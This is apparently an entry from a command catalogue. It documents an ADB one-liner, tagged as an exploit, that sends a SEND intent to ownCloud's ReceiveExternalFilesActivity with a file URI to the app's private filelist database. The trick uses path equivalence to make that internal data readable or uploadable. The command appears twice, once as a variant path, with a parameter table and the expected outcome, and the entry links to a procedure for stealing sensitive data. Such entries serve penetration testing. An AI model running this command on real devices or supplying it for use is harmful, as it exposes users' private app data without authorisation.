---
data: >-
  adb shell am start -n
  com.owncloud.android/.ui.activity.ReceiveExternalFilesActivity -t "text/plain"
  --grant-read-uri-permission -a "android.intent.action.SEND" --eu
  "android.intent.extra.STREAM"
  "file:///data/user/0/com.owncloud.android/databases/filelist"
tags:
  - adb
  - android
  - exploit
type: command
output: null
executor: bash
platforms:
  - Android
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:45.265Z'
id: 4cccf845-73df-4c06-b30c-dfd77771c2dc
verified: false
validated: true
submitted: true
---
# ADB Send Intent to Filelist DB

## Command

```bash
adb shell am start -n com.owncloud.android/.ui.activity.ReceiveExternalFilesActivity -t "text/plain" --grant-read-uri-permission -a "android.intent.action.SEND" --eu "android.intent.extra.STREAM" "file:///data/user/0/com.owncloud.android/databases/filelist"
```

## Description

This ADB command starts the ownCloud ReceiveExternalFilesActivity with a SEND intent carrying a URI to the internal filelist database, exploiting path equivalence to grant read access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -n | Specifies the component (package/activity) | Yes |
| -t "text/plain" | MIME type for the intent | Yes |
| --grant-read-uri-permission | Grants read access to the URI | Yes |
| -a "android.intent.action.SEND" | Intent action | Yes |
| --eu "android.intent.extra.STREAM" | Extra with the file URI | Yes |

## Examples

### Basic Usage

```bash
# As above
```

### Advanced Usage

```bash
# Use direct path
adb shell am start -n com.owncloud.android/.ui.activity.ReceiveExternalFilesActivity -t "text/plain" --grant-read-uri-permission -a "android.intent.action.SEND" --eu "android.intent.extra.STREAM" "file:///data/data/com.owncloud.android/databases/filelist"
```

## Expected Output

Activity launches successfully; the app processes the database file, making its contents accessible or uploadable.

## Related

- [[Related Procedure: Send Intent to Steal Sensitive Data]]
